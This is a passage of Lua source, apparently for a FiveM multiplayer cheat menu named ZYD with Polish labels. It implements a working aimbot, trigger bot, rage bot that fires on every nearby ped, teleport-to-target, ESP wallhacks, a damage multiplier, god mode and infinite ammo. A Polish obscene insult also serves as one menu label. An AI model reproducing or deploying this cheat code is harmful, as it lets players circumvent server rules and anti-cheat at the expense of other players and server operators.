                ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                self.Config.Player.God = not self.Config.Player.God
                
            end
        end

        local _w = (self.Painter:GetTextWidth("TELEPORT TO COORDS", 4, 0.37)) + 2

        local _w = (self.Painter:GetTextWidth("Teleportuj do znaczka", 4, 0.37)) + 2
		
		curY = curY + 25

        if self.Painter:CheckBox("~g~Nieskonczona stamina", self.Config.Player.InfiniteStamina, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "infinite_stamina") then
            self.Config.Player.InfiniteStamina = not self.Config.Player.InfiniteStamina
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~g~Szybkie bieganie", self.Config.Player.FastRun, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fast_af_runna_enabled") then
            self.Config.Player.FastRun = not self.Config.Player.FastRun
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~g~Wysokie skakanie", self.Config.Player.SuperJump, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "big_jump_enabled") then
            self.Config.Player.SuperJump = not self.Config.Player.SuperJump
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~g~Wymusz radar", self.Config.Player.ForceRadar, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "force_radar") then
            self.Config.Player.ForceRadar = not self.Config.Player.ForceRadar
            
        end

        curY = curY + 20

    end)

    ZYD:AddCategory("~g~Widok", function(self, x, y)
        local curY = 5

        if self.Painter:CheckBox("~b~Esp", self.Config.Player.ESP, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esp_enabled") then
            self.Config.Player.ESP = not self.Config.Player.ESP
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Box", self.Config.Player.Box, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esp_box_enabled") then
            self.Config.Player.Box = not self.Config.Player.Box
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Znaki na mapie", self.Config.Player.Blips, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esp_blips_enabled") then
            if self.Config.Player.Blips then
                self:DoBlips(true)
            end

            self.Config.Player.Blips = not self.Config.Player.Blips
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Celownik", self.Config.Player.CrossHair, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "crosshair_enabled") then
            self.Config.Player.CrossHair = not self.Config.Player.CrossHair
            
        end

        curY = curY + 20

        if self.Painter:Button("~y~Dystans dzialania Esp: " .. self.Config.Player.ESPDistance, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_aimbot_fov") then
            local new = ZYD:GetTextInput("Wprowadz dystans dzialania ESP  [35-50000]", self.Config.Player.ESPDistance, 7)
            if not dict.tonumber(new) then return ZYD:AddNotification("ERROR", "Niepoprwany dystans.") end
            if dict.tonumber(new) < 35 or dict.tonumber(new) > 50000 then return ZYD:AddNotification("ERROR", "Niepoprwany dystans.") end
            self.Config.Player.ESPDistance = dict.tonumber(new) + 0.0
            ZYD:AddNotification("SUCCESS", "Zmieniono dystans dzialania ESP " .. self.Config.Player.ESPDistance .. ".")
            
        end
    end)

    local bone_check = {{31086, "SKEL_HEAD"}, {0, "SKEL_ROOT"}, {22711, "SKEL_L_Forearm"}, {28252, "SKEL_R_Forearm"}, {45509, "SKEL_L_UpperArm"}, {40269, "SKEL_R_UpperArm"}, {58271, "SKEL_L_Thigh"}, {51826, "SKEL_R_Thigh"}, {24816, "SKEL_Spine1"}, {24817, "SKEL_Spine2"}, {24818, "SKEL_Spine3"}, {14201, "SKEL_L_Foot"}, {52301, "SKEL_R_Foot"}}
    local aimbot_bones = {"SKEL_HEAD", "SKEL_ROOT", "SKEL_L_Forearm", "SKEL_R_Forearm", "SKEL_L_UpperArm", "SKEL_R_UpperArm", "SKEL_L_Thigh", "SKEL_R_Thigh", "SKEL_Spine1", "SKEL_Spine2", "SKEL_Spine3", "SKEL_L_Foot", "SKEL_R_Foot"}

    ZYD:AddCategory("~g~Walka", function(self, x, y, w, h)
        local curY = 5

        if self.Painter:CheckBox("~y~Trigger bot - Automatyczne strzelanie", self.Config.Player.TriggerBot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "trigger_bot_enabled") then
            self.Config.Player.TriggerBot = not self.Config.Player.TriggerBot
            
        end

        local _w = (self.Painter:GetTextWidth("ANTI AIM", 4, 0.35)) + 20

        if self.Painter:CheckBox("~b~JEBAC KABOOMA KURWE", self.Config.Player.AntiAim, x, y, w - _w - 10, curY, 200, 20, 255, 255, 255, 255, "anti_aim_enabled") then
            self.Config.Player.AntiAim = not self.Config.Player.AntiAim
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~y~Aimbot", self.Config.Player.Aimbot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_enabled") then
            self.Config.Player.Aimbot = not self.Config.Player.Aimbot
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~y~Pokaz FOV Aimbota", self.Config.Player.AimbotDrawFOV, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "draw_aimbot_fov") then
            self.Config.Player.AimbotDrawFOV = not self.Config.Player.AimbotDrawFOV
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~y~Cel - Tylko gracze", self.Config.Player.OnlyTargetPlayers, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "only_target_players") then
            self.Config.Player.OnlyTargetPlayers = not self.Config.Player.OnlyTargetPlayers
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~y~Brak przeladowania", self.Config.Player.NoReload, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "no_reload") then
            self.Config.Player.NoReload = not self.Config.Player.NoReload
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~y~Nieskonczona amunicja", self.Config.Player.InfiniteAmmo, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "infinite_ammo") then
            self.Config.Player.InfiniteAmmo = not self.Config.Player.InfiniteAmmo
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~y~Wybuchajaca amunicja", self.Config.Player.ExplosiveAmmo, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explosive_ammo") then
            self.Config.Player.ExplosiveAmmo = not self.Config.Player.ExplosiveAmmo
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~y~DMG Boost [Raczej dziala]", self.Config.Player.OneTap, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "one_tap_enabled") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                self.Config.Player.OneTap = not self.Config.Player.OneTap
                
            end
        end

        curY = curY + 20

        if self.Painter:ListChoice("~g~Dzialanie Aimbota na kosc: ", aimbot_bones, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_bone") then
            self.Config.Player.AimbotBone = list_choices["aimbot_bone"].selected
            
        end

        curY = curY + 25

        if self.Painter:Button("~g~Fov Aimbota: " .. self.Config.Player.AimbotFOV, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_aimbot_fov") then
            local new = ZYD:GetTextInput("Podaj FOV Aimbota [35-500]", self.Config.Player.AimbotFOV, 7)
            if not dict.tonumber(new) then return ZYD:AddNotification("ERROR", "Nieprawidlowy Fov") end
            if dict.tonumber(new) < 35 or dict.tonumber(new) > 500 then return ZYD:AddNotification("ERROR", "Nieprawidlowy Fov") end
            self.Config.Player.AimbotFOV = dict.tonumber(new) + 0.0
            ZYD:AddNotification("SUCCESS", "Zmieniono Fov Aimbota na " .. self.Config.Player.AimbotFOV .. ".")
            
        end

        curY = curY + 25

        if self.Painter:Button("~g~Dystans dzialania Triggerbota: " .. self.Config.Player.TriggerBotDistance, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_trigger_bot_distance") then
            local new = ZYD:GetTextInput("Podaj dystans dzialania Triggerbota [10-10000]", self.Config.Player.TriggerBotDistance, 7)
            if not dict.tonumber(new) then return ZYD:AddNotification("ERROR", "Nieprawidlowy dystans") end
            if dict.tonumber(new) < 10 or dict.tonumber(new) > 10000 then return ZYD:AddNotification("ERROR", "Nieprawidlowy dystans") end
            self.Config.Player.TriggerBotDistance = dict.tonumber(new) + 0.0
            ZYD:AddNotification("Udane", "Zmieniono dystans na  " .. self.Config.Player.TriggerBotDistance .. ".")
            
        end

        curY = curY + 25

        if self.Painter:Button("~g~Threshold TP Aimbota: " .. self.Config.Player.TPAimbotThreshold, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_tp_aimbot_threshold") then
            local new = ZYD:GetTextInput("Podaj Threshold TP Aimbota [10-1000]", self.Config.Player.TPAimbotThreshold, 7)
            if not dict.tonumber(new) then return ZYD:AddNotification("ERROR", "Nieprawidlowy dystans") end
            if dict.tonumber(new) < 10 or dict.tonumber(new) > 1000 then return ZYD:AddNotification("ERROR", "Nieprawidlowy dystans") end
            self.Config.Player.TPAimbotThreshold = dict.tonumber(new) + 0.0
            ZYD:AddNotification("SUCCESS", "Zmieniono Threshold TP Aimbota na " .. self.Config.Player.TPAimbotThreshold .. ".")
            
        end

        curY = curY + 25

        if self.Painter:Button("~g~Dystans dzialania TP Aimbota: " .. self.Config.Player.TPAimbotDistance, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_tp_aimbot_distance") then
            local new = ZYD:GetTextInput("Podaj dystans dzialania TP Aimbota [0-10]", self.Config.Player.TPAimbotDistance, 7)
            if not dict.tonumber(new) then return ZYD:AddNotification("ERROR", "Nieprawidlowy dystans") end
            if dict.tonumber(new) < 0 or dict.tonumber(new) > 10 then return ZYD:AddNotification("ERROR", "Nieprawidlowy dystans") end
            self.Config.Player.TPAimbotDistance = dict.tonumber(new) + 0.0
            ZYD:AddNotification("SUCCESS", "Zmieniono dystans dzialania TP Aimbota na " .. self.Config.Player.TPAimbotDistance .. ".")
            
        end
    end)

    local function _is_ped_player(ped)
        local id = ZYD:GetFunction("NetworkGetPlayerIndexFromPed")(ped)

        return id and id > 0
    end

    local function rot_to_dir(rot)
        local radZ = rot.z * 0.0174532924
        local radX = rot.x * 0.0174532924
        local num = dict.math.abs(dict.math.cos(radX))
        local dir = vector3(-dict.math.sin(radZ) * num, dict.math.cos(radZ) * num, radX)

        return dir
    end

    local function _multiply(vector, mult)
        return vector3(vector.x * mult, vector.y * mult, vector.z * mult)
    end

    local function _get_ped_hovered_over()
        local cur = ZYD:GetFunction("GetGameplayCamCoord")()
        local _dir = ZYD:GetFunction("GetGameplayCamRot")(0)
        local dir = rot_to_dir(_dir)
        local len = _multiply(dir, ZYD.Config.Player.TriggerBotDistance)
        local targ = cur + len
        local handle = ZYD:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)
        local _, hit, hit_pos, _, entity = ZYD:GetFunction("GetShapeTestResult")(handle)
        local force
        local _seat

        if ZYD:GetFunction("DoesEntityExist")(entity) and ZYD:GetFunction("IsEntityAVehicle")(entity) and ZYD.Config.Player.TargetInsideVehicles and ZYD:GetFunction("HasEntityClearLosToEntityInFront")(ZYD:GetFunction("PlayerPedId")(), entity) then
            local driver = ZYD:GetFunction("GetPedInVehicleSeat")(entity, -1)

            if ZYD:GetFunction("DoesEntityExist")(driver) and not ZYD:GetFunction("IsPedDeadOrDying")(driver) then
                entity = driver
                force = true
                _seat = -1
            else
                local _dist = dict.math.huge
                local _ped

                for i = -2, ZYD:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do
                    local who = ZYD:GetFunction("GetPedInVehicleSeat")(entity, i)

                    if ZYD:GetFunction("DoesEntityExist")(who) and ZYD:GetFunction("IsEntityAPed")(who) and not ZYD:GetFunction("IsPedDeadOrDying")(who) then
                        local s_pos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(who, 0.0, 0.0, 0.0)
                        local s_dist = ZYD:GetFunction("GetDistanceBetweenCoords")(hit_pos.x, hit_pos.y, hit_pos.z, s_pos.x, s_pos.y, s_pos.z, true)

                        if s_dist < _dist then
                            _dist = s_dist
                            _ped = who
                            _seat = i
                        end
                    end
                end

                if ZYD:GetFunction("DoesEntityExist")(_ped) and ZYD:GetFunction("IsEntityAPed")(_ped) then
                    entity = _ped
                    force = true
                end
            end
        end

        if hit and ZYD:GetFunction("DoesEntityExist")(entity) and ZYD:GetFunction("DoesEntityHaveDrawable")(entity) and ZYD:GetFunction("IsEntityAPed")(entity) and (force or ZYD:GetFunction("HasEntityClearLosToEntityInFront")(ZYD:GetFunction("PlayerPedId")(), entity)) then return true, entity, _seat end

        return nil, false, nil
    end

    local _aimbot_poly = {}

    local function _within_poly(point, poly)
        local inside = false
        local j = #poly

        for i = 1, #poly do
            if (poly[i].y < point.y and poly[j].y >= point.y or poly[j].y < point.y and poly[i].y >= point.y) and (poly[i].x + (point.y - poly[i].y) / (poly[j].y - poly[i].y) * (poly[j].x - poly[i].x) < point.x) then
                inside = not inside
            end

            j = i
        end

        return inside
    end

    local function _is_ped_in_aimbot_fov(ped)
        local pos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
        local showing, sx, sy = ZYD:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
        if not showing then return false end

        return _within_poly({
            x = sx,
            y = sy
        }, _aimbot_poly.points)
    end

    local function _get_ped_in_aimbot_fov()
        local fov = ZYD.Config.Player.AimbotFOV
        local closest = dict.math.huge
        local selected

        for ped in ZYD:EnumeratePeds() do
            if not ZYD:IsFriend(ped) and (not ZYD.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then
                local pos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                local showing, sx, sy = ZYD:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)

                if ped ~= ZYD:GetFunction("PlayerPedId")() and showing and (not ZYD.Config.Player.AimbotNeedsLOS or ZYD:GetFunction("HasEntityClearLosToEntityInFront")(ZYD:GetFunction("PlayerPedId")(), ped)) then
                    local in_fov = _is_ped_in_aimbot_fov(ped)
                    local us = ZYD:GetFunction("GetGameplayCamCoord")()
                    local dist = ZYD:GetFunction("GetDistanceBetweenCoords")(pos.x, pos.y, pos.z, us.x, us.y, us.z)

                    if in_fov and dist < closest then
                        dist = closest
                        selected = ped
                    end
                end
            end
        end

        if selected and (not ZYD:GetFunction("DoesEntityExist")(ZYD.Config.Player.AimbotTarget) or ZYD:GetFunction("IsEntityDead")(ZYD.Config.Player.AimbotTarget)) and not ZYD:IsFriend(selected) and ZYD:GetFunction("HasEntityClearLosToEntity")(ZYD:GetFunction("PlayerPedId")(), selected) then
            ZYD.Config.Player.AimbotTarget = selected
        end

        local _ped = _get_ped_hovered_over()

        if not ZYD.Config.Player.AimbotTarget and ZYD:GetFunction("DoesEntityExist")(_ped) and not ZYD:IsFriend(_ped) and (not ZYD.Config.Player.OnlyTargetPlayers or _is_ped_player(_ped)) then
            local pos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 0.0)
            local showing, sx, sy = ZYD:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)

            -- and ZYD:GetFunction("HasEntityClearLosToEntityInFront")(ZYD:GetFunction("PlayerPedId")(), ped) then
            if _ped ~= ZYD:GetFunction("PlayerPedId")() and showing and (not ZYD.Config.Player.AimbotNeedsLOS or ZYD:GetFunction("HasEntityClearLosToEntityInFront")(ZYD:GetFunction("PlayerPedId")(), ped)) then
                local in_fov = _is_ped_in_aimbot_fov(_ped)

                if in_fov and not ZYD:GetFunction("DoesEntityExist")(ZYD.Config.Player.AimbotTarget) then
                    ZYD.Config.Player.AimbotTarget = _ped
                end
            end
        end
    end

    local function _get_closest_bone(ped, _seat)
        local cur = ZYD:GetFunction("GetGameplayCamCoord")()
        local _dir = ZYD:GetFunction("GetGameplayCamRot")(0)
        local dir = rot_to_dir(_dir)
        local where = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
        local dist = ZYD:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, where.x, where.y, where.z) + 25.0
        local len = _multiply(dir, dist)
        local targ = cur + len
        local handle = ZYD:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)
        local _, hit, hit_pos, _, entity = ZYD:GetFunction("GetShapeTestResult")(handle)

        if ZYD:GetFunction("IsEntityAVehicle")(entity) then
            entity = ZYD:GetFunction("GetPedInVehicleSeat")(entity, _seat)
        end

        if entity ~= ped then return false end
        local _dist, bone, _name = dict.math.huge, 0

        if hit then
            for _, dat in dict.ipairs(bone_check) do
                local id = dat[1]

                if id ~= -1 then
                    local bone_coords = ZYD:GetFunction("GetPedBoneCoords")(ped, id, 0.0, 0.0, 0.0)
                    local b_dist = ZYD:GetFunction("GetDistanceBetweenCoords")(bone_coords.x, bone_coords.y, bone_coords.z, hit_pos.x, hit_pos.y, hit_pos.z, true)

                    if b_dist < _dist then
                        _dist = b_dist
                        bone = id
                        _name = dat[2]
                    end
                end
            end
        end

        return bone, _dist, _name
    end

    function ZYD:DoAimbotPoly()
        local sx, sy = _aimbot_poly.sx, _aimbot_poly.sy
        local fov = self.Config.Player.AimbotFOV
        if not fov then return end
        if sx and ZYD:ScrW() == sx and sy and ZYD:ScrH() == sy and _aimbot_poly.fov == self.Config.Player.AimbotFOV then return end
        _aimbot_poly.sx = ZYD:ScrW()
        _aimbot_poly.sy = ZYD:ScrH()
        _aimbot_poly.fov = self.Config.Player.AimbotFOV
        _aimbot_poly.points = {}

        for i = 1, 360 do
            local x = dict.math.cos(dict.math.rad(i)) / ZYD:ScrW()
            local y = dict.math.sin(dict.math.rad(i)) / ZYD:ScrH()
            local sx, sy = x * fov, y * fov

            _aimbot_poly.points[#_aimbot_poly.points + 1] = {
                x = sx + ((ZYD:ScrW() / 2) / ZYD:ScrW()),
                y = sy + ((ZYD:ScrH() / 2) / ZYD:ScrH())
            }
        end
    end

    function ZYD:DrawAimbotFOV()
        for _, dat in dict.ipairs(_aimbot_poly.points) do
            DrawRect(dat.x, dat.y, 5 / ZYD:ScrW(), 5 / ZYD:ScrH(), ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3], 70)
        end
    end

    function ZYD:_rage_bot()
        for ped in ZYD:EnumeratePeds() do
            if ZYD:GetFunction("DoesEntityExist")(ped) and ZYD:GetFunction("IsEntityAPed")(ped) and ped ~= ZYD:GetFunction("PlayerPedId")() and not ZYD:GetFunction("IsPedDeadOrDying")(ped) then
                if not ZYD:IsFriend(ped) and (not ZYD.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then
                    if ZYD.Config.Player.OneTap then
                        ZYD:GetFunction("SetPlayerWeaponDamageModifier")(ZYD:GetFunction("PlayerId")(), 100.0)
                    end

                    local destination = ZYD:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)
                    local origin = ZYD:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)
                    local where = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 1.0)

                    if self.Config.ShowText then
                        self:Draw3DText(where.x, where.y, where.z, "*RAGED*", 255, 55, 70, 255)
                    end

                    ZYD:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, ZYD:GetFunction("GetSelectedPedWeapon")(ZYD:GetFunction("PlayerPedId")()), ZYD:GetFunction("PlayerPedId")(), true, false, 24000.0)

                    if ZYD.Config.Player.OneTap then
                        ZYD:GetFunction("SetPlayerWeaponDamageModifier")(ZYD:GetFunction("PlayerId")(), 1.0)
                    end
                end
            end
        end
    end

    function ZYD:_no_bullet_drop()
        if IsDisabledControlPressed(0, ZYD.Keys["MOUSE1"]) and not ZYD.Showing and (not ZYD.FreeCam.On and not ZYD.RCCar.CamOn) then
            local curWep = ZYD:GetFunction("GetSelectedPedWeapon")(ZYD:GetFunction("PlayerPedId")())
            local cur = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetCurrentPedWeaponEntityIndex")(ZYD:GetFunction("PlayerPedId")()), 0.0, 0.0, 0.0)
            local _dir = ZYD:GetFunction("GetGameplayCamRot")(0)
            local dir = rot_to_dir(_dir)
            local dist = 99999.9
            local len = _multiply(dir, dist)
            local targ = cur + len
            ZYD:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, ZYD:GetFunction("PlayerPedId")(), true, true, 24000.0)
            ZYD:GetFunction("SetPedShootsAtCoord")(ZYD:GetFunction("PlayerPedId")(), targ.x, targ.y, targ.z, true)
        end
    end

    function ZYD:_trigger_bot()
        local found, ent, _seat = _get_ped_hovered_over()

        if found and ZYD:GetFunction("DoesEntityExist")(ent) and ZYD:GetFunction("IsEntityAPed")(ent) and not ZYD:IsFriend(ent) and ZYD:GetFunction("IsPedWeaponReadyToShoot")(ZYD:GetFunction("PlayerPedId")()) and (not ZYD.Config.Player.OnlyTargetPlayers or _is_ped_player(ent)) and (not ZYD.Config.Player.TriggerBotNeedsLOS or ZYD:GetFunction("HasEntityClearLosToEntityInFront")(ZYD:GetFunction("PlayerPedId")(), ent)) then
            local _bone, _dist, _name = _get_closest_bone(ent, _seat)

            -- SKEL_HEAD
            if _seat ~= nil then
                _bone = 31086
            end

            if _bone and not ZYD:GetFunction("IsPedDeadOrDying")(ent) then
                if ZYD.Config.Player.OneTap then
                    ZYD:GetFunction("SetPlayerWeaponDamageModifier")(ZYD:GetFunction("PlayerId")(), 100.0)
                end

                local _pos = ZYD:GetFunction("GetPedBoneCoords")(ent, _bone, 0.0, 0.0, 0.0)
                local where = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 1.0)
                self:Draw3DText(where.x, where.y, where.z + 0.2, "*TRIGGER BOT SHOOTING*", 255, 0, 0, 255)
                ZYD:GetFunction("SetPedShootsAtCoord")(ZYD:GetFunction("PlayerPedId")(), _pos.x, _pos.y, _pos.z, true)

                if ZYD.Config.Player.OneTap then
                    ZYD:GetFunction("SetPlayerWeaponDamageModifier")(ZYD:GetFunction("PlayerId")(), 1.0)
                end
            end
        end
    end

    function ZYD:_aimbot()
        SetCamAffectsAiming(GetRenderingCam(), false)
        local _ped = _get_ped_in_aimbot_fov()

        if self.Config.Player.AimbotTarget and (not ZYD:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) or ZYD:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget)) then
            self.Config.Player.AimbotTarget = nil
        end

        if self.Config.Player.AimbotTarget and ZYD:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not ZYD:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then
            _ped = self.Config.Player.AimbotTarget
        end


        if ZYD:GetFunction("DoesEntityExist")(_ped) and not ZYD:GetFunction("IsPedDeadOrDying")(_ped) then
            if not self.Config.Player.AimbotTarget then
                self.Config.Player.AimbotTarget = _ped
            end

            local where = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)
            local _pos = ZYD:GetFunction("GetPedBoneCoords")(_ped, bone_check[self.Config.Player.AimbotBone][1], 0.0, 0.0, 0.0)

            if self.Config.ShowText then
                self:Draw3DText(where.x, where.y, where.z, "*AIMBOT LOCKED*", 255, 0, 0, 255)
            end

            ZYD:GetFunction("DisableControlAction", 0, ZYD.Keys[self.Config.Player.AimbotKey], true)

            if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys[self.Config.Player.AimbotKey]) then
                if ZYD.Config.Player.OneTap then
                    ZYD:GetFunction("SetPlayerWeaponDamageModifier")(ZYD:GetFunction("PlayerId")(), 9999.9)
                end

                ZYD:GetFunction("SetPedShootsAtCoord")(ZYD:GetFunction("PlayerPedId")(), _pos.x, _pos.y, _pos.z, true)
                local _on_screen, sx, sy = ZYD:GetFunction("GetScreenCoordFromWorldCoord")(_pos.x, _pos.y, _pos.z)
                ZYD:GetFunction("SetCursorLocation")(sx, sy)

                if ZYD.Config.Player.OneTap then
                    ZYD:GetFunction("SetPlayerWeaponDamageModifier")(ZYD:GetFunction("PlayerId")(), 1.0)
                end
            end
        end
    end

    function ZYD:_tp_aimbot()
        local them = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Config.Player.AimbotTarget, 0.0, 0.0, 0.0)
        local us = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
        local dist = ZYD:GetFunction("GetDistanceBetweenCoords")(them.x, them.y, them.z, us.x, us.y, us.z)

        if dist > self.Config.Player.TPAimbotThreshold then
            local fwd = ZYD:GetFunction("GetEntityForwardVector")(self.Config.Player.AimbotTarget)
            local spot = them + (fwd * -self.Config.Player.TPAimbotDistance)
            ZYD:GetFunction("SetEntityCoords")(ZYD:GetFunction("PlayerPedId")(), spot.x, spot.y, spot.z - 1.0)
            local rot = ZYD:GetFunction("GetEntityRotation")(self.Config.Player.AimbotTarget)
            ZYD:GetFunction("SetEntityRotation")(ZYD:GetFunction("PlayerPedId")(), rot.x, rot.y, rot.z, 0, true)
        end
    end

    function ZYD:DoAimbot()
        if not self.Config.Player.AimbotFOV or not self._ScrW or not self._ScrH then return end
        self:DoAimbotPoly()

        if self.Config.Player.AimbotDrawFOV then
            self:DrawAimbotFOV()
        end

        if not ZYD:GetFunction("IsPlayerFreeAiming")(ZYD:GetFunction("PlayerId")()) and not ZYD:GetFunction("IsPedDoingDriveby")(ZYD:GetFunction("PlayerPedId")()) then
            self.Config.Player.AimbotTarget = nil

            return
        end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys[self.Config.Player.AimbotReleaseKey]) then
            self.Config.Player.AimbotTarget = nil
        end

        if self.Config.Player.RageBot then
            self:_rage_bot()
        end

        if self.Config.Player.TriggerBot then
            self:_trigger_bot()
        end

        if self.Config.Player.NoDrop then
            self:_no_bullet_drop()
        end

        if self.Config.Player.Aimbot then
            self:_aimbot()
        end

        if self.Config.Player.TPAimbot and self.Config.Player.Aimbot and self.Config.Player.AimbotTarget and ZYD:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not ZYD:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then
            self:_tp_aimbot()
        end
    end

    CreateThread(function()
        while ZYD.Enabled do
            Wait(0)
            ZYD:DoAimbot()
        end
    end)

    ZYD:AddCategory("~g~Postac", function(self, x, y)
        local curY = 0

        if self.Painter:Button("~b~Losowe ciuchy~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "skin_random") then
            CreateThread(function()
                ZYD:SetPedModel("mp_m_freemode_01")
                ZYD:GetFunction("SetPedRandomComponentVariation")(ZYD:GetFunction("PlayerPedId")(), true)
                ZYD:GetFunction("SetPedRandomProps")(ZYD:GetFunction("PlayerPedId")(), true)
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~g~----ZWIERZETA----~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "covid_19") then
            CreateThread(function()
                GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_UNARM"), 999999, false, true)
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~b~Dzik~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "covid_19") then
            CreateThread(function()
                ZYD:SetPedModel("a_c_boar")
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~b~Pies~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "covid_19") then
            CreateThread(function()
                ZYD:SetPedModel("a_c_pug")
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~b~Jelen~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "covid_19") then
            CreateThread(function()
                ZYD:SetPedModel("a_c_deer")
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~b~Swinia~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "covid_19") then
            CreateThread(function()
                ZYD:SetPedModel("a_c_pig")
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~g~------------------~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "covid_19") then
        CreateThread(function()
            GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_UNARM"), 999999, false, true)
        end)
    end

    curY = curY + 25

        if self.Painter:Button("~b~Niestandardowy ped - Wpisz", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "custom_model") then
            CreateThread(function()
                local mdl = ZYD:GetTextInput("Wpisz nazwe peda.", "", 50)

                if not mdl or mdl == "" then
                    ZYD:AddNotification("INFO", "Anulowano.", 5000)
                else
                    ZYD:SetPedModel(mdl)
                end
            end)
        end

        curY = curY + 25
    end)

    local function _has_value(tab, val)
        for key, value in dict.pairs(tab) do
            if value == val then return true end
        end

        return false
    end

    local function _find_weapon(str)
        if _has_value(all_weapons, str) then return str end

        for _, wep in dict.ipairs(all_weapons) do
            if wep:lower():find(str:lower()) then return wep end
        end

        return false
    end

    ZYD:AddCategory("~g~Bronie", function(self, x, y)
        local curY = 0

        if self.Painter:Button("~g~Dodaj wszystkie bronie - Dla siebie", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_self_all_weapons") then
            for _, wep in dict.ipairs(all_weapons) do
                ZYD:GetFunction("GiveWeaponToPed")(ZYD:GetFunction("PlayerPedId")(), ZYD:GetFunction("GetHashKey")(wep), 500, false, true)
            end

